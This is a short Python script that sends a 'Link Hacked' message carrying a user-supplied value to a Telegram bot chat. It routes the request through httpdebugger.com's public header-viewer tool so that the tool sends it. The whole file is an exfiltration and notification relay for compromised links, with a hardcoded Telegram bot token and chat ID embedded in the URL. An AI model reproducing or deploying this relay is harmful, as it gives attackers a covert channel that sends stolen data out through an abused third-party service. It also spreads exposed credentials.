import requests
import platform 
import sys
sys.argv[0]
Example = sys.argv[1]
url = "https://api.telegram.org/bot1611642670:AAEKRsaSXmhfVCYOVtJVEn9ccv36ekFmeew/SendMessage?chat_id=1119653364&text=Link Hacked >>> "+Example
payload = {"UrlBox":url,  
"AgentList":"Mozilla Firefox",
"VersionsList":"HTTP/1.1",
"MethodList":"POST"
}

r = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payload)

